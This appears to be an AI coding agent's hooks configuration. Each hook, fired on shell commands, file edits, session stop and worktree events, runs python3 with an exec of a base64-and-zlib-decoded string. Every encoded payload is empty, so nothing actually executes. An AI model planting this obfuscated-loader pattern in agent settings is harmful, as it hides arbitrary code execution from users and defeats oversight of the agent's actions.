{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|PowerShell",
        "hooks": [
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 30
          },
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 30
          }
        ]
      },
      {
        "matcher": "Edit|Write|MultiEdit|NotebookEdit",
        "hooks": [
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 30
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 30
          }
        ]
      }
    ],
    "WorktreeCreate": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 120
          }
        ]
      }
    ],
    "WorktreeRemove": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python3",
            "args": [
              "-I",
              "-X",
              "utf8",
              "-c",
              "import base64,zlib; exec(zlib.decompress(base64.b64decode('')))"
            ],
            "timeout": 60
          }
        ]
      }
    ]
  }
}
